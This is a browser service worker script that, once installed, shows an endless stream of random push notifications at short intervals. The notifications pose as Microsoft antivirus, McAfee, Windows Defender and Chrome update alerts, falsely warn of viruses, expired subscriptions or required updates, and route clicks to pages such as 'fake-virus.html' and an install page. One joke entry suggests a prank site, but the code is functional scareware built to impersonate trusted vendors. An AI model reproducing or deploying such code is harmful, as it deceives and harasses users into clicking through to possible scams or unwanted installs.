self.addEventListener("install", (e) => self.skipWaiting());
self.addEventListener("activate", (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('notificationclick', (e) => {
  e.notification.close();
  const action = e.action;
  const data = e.notification.data;

  if (action) {
    const url = data.actionUrls?.[action];
    if (url) e.waitUntil(clients.openWindow(url));
  } else if (data.url) {
    e.waitUntil(clients.openWindow(data.url));
  }
});

function showRandomNotification() {
  const notifications = [
    {
      title: "Remove Threats Now!",
      body: "VIRUS DETECTED. REMOVE THREATS NOW WITH MICROSOFT ANTIVIRUS",
      icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/Microsoft%20Antivirus.png",
      url: "../nnm-ae/1000/gb20-aderror.html",
      actions: [
        { action: "scan", title: "🛡️ Scan Now" }
      ],
      actionUrls: {
        scan: "../nnm-ae/1000/gb20-aderror.html",
      }
    },
    {
      title: "Make your phone happy.",
      body: "MAKE YOUR PHONE HAPPY NOW. IT IS VERY IMPORTANT.",
      icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/OpuaYT.webp",
      url: "../pages/happyphone.html",
      actions: [
        { action: "happy", title: "📱 Make it Happy"}
      ],
      actionUrls: {
        scan: "../pages/happyphone.html"
      }
    },
    {
      title: "McAfee Subscription Expired",
      body: "Your McAfee subscription has expired. Renew now to protect your device.",
      icon: "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fpng.pngtree.com%2Ftemplate%2F20220612%2Fourmid%2Fpngtree-virus-detected-warning-alert-message-on-computer-screen-image_1830770.jpg&f=1&nofb=1&ipt=6c27942c4aff0680bb81b7b67669a942d02a68876bcbbddfda806bf4e34ad424&ipo=images",
      url: "../nnm-ae/1000/gb20-aderror.html",
      actions: [
        { action: "renew", title: "🔒 Renew Now" }
      ],
      actionUrls: {
        renew: "../nnm-ae/1000/gb20-aderror.html"
      }
    },
    {
      title: "Windows Defender found a virus on your computer!",
      body: "Windows Defender found a trojan virus on your computer and can remove it for you. This will not slow down your computer and will only take a few seconds. Leaving this virus without deletion might infect your computer.",
      icon: "http://tetapux.vercel.app/assets/shield.jpg",
      url: "../pages/fake-virus.html",
      actions: [
        { action: "ignore", title: "Ignore (unsafe)" },
        { action: "remove_virus", title: "🛡️ Remove virus now" }
      ],
      actionUrls: {
        remove_virus: "../pages/fake-virus.html"
      }
    },
    {
      title: "Bun installation required to secure your PC",
      body: "You need to install Bun to protect your device from viruses and malware. Click here to install Bun now.",
      icon: "http://tetapux.vercel.app/assets/danger.png",
      url: "../red/premium-colors/bun.html",
      actions: [
        { action: "remove_virus", title: "🛡️ Install Bun now" }
      ],
      actionUrls: {
        remove_virus: "../red/premium-colors/bun.html"
      }
    },
    {
      title: "Chrome update required. Update now to keep your Chrome browser running smoothly and securely.",
      body: "Update now to keep your Chrome browser running smoothly and securely.",
      icon: "https://www.google.com/chrome/static/images/chrome-logo.svg",
      url: "../pages/update-chrome2.html",
      actions: [
        { action: "remove_virus", title: "Update Chrome" }
      ],
      actionUrls: {
        remove_virus: "../pages/update-chrome2.html"
      }
    }
  ];

  const randomNotif = notifications[Math.floor(Math.random() * notifications.length)];
  const delay = Math.random() * 8800 + 1200;

  self.registration.showNotification(randomNotif.title, {
    body: randomNotif.body,
    icon: randomNotif.icon,
    actions: randomNotif.actions,
    data: {
      url: randomNotif.url,
      actionUrls: randomNotif.actionUrls
    }
  });

  setTimeout(showRandomNotification, delay);
}

setTimeout(showRandomNotification, Math.random() * 8800 + 1200);